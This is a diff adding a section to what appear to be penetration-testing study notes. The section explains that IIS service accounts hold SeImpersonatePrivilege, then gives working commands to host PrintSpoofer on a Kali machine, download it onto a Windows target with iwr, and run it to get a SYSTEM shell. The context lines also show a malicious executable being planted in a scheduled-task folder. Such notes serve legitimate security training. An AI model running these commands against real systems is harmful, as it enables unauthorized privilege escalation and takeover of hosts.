@@ -646,7 +646,30 @@ Transfer Malicious File: `iwr -Uri http://192.168.119.3/adduser.exe -Outfile Bac
 
 Move Malicious File into task space: `move .\BackendCacheCleanup.exe .\Location-HERE\`
 
+### Windows Exploits 
 
+Internet Information Server (IIS) web server - which will run as:
+
+* LocalService
+* LocalSystem
+* NetworkService
+* ApplicationPoolIdentity
+
+This is important because these all have **SeImpersonatePrivilege** assigned. 
+
+**SeImpersonatePrivilege** allows us to impersonate a prilieged user. 
+
+We will demonstrate with a tool PrintSpoofer
+
+Kali, download Printspoofer and host http serv for transfer: `wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe && python3 -m http.server 80`
+
+In Powershell, check if SeImpersonatePrivilege is enabled: `whoami /priv`
+
+Download malicious exe: `iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe` 
+
+Run the exploit: `.\PrintSpoofer64.exe -i -c powershell.exe`
+
+Am I **system**?
 
 # Anti-virus Evasion
 
